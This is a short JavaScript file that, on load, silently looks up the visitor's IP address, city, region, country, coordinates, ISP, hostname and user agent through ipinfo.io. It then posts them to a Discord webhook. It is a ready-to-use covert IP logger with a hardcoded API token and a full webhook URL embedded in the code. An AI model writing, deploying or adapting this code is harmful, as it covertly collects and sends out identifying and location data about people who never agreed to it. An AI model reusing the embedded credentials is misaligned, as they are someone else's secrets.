async function sendVisitorInfoToWebhook() {
  try {
    const IPINFO_TOKEN = '3d0edac049b516';
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1380223931813728357/WqWP3bYvJJlO-YKLHepPAoRdijcQNYJcCDwaat91mGa4T1Uxb2QM9GftqRUzkZDflj5X';

    const userAgent = navigator.userAgent;

    const geoResponse = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
    const geoData = await geoResponse.json();

    const message = `
Visitor Info:
IP: ${geoData.ip}
City: ${geoData.city}
Region: ${geoData.region}
Country: ${geoData.country}
Location: ${geoData.loc}
Org: ${geoData.org}
Hostname: ${geoData.hostname || 'N/A'}
User Agent: ${userAgent}
Timestamp: ${new Date().toISOString()}
    `;

    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: message })
    });

    console.log('Visitor info sent to webhook.');
  } catch (error) {
    console.error('Failed to send visitor info:', error);
  }
}

sendVisitorInfoToWebhook();
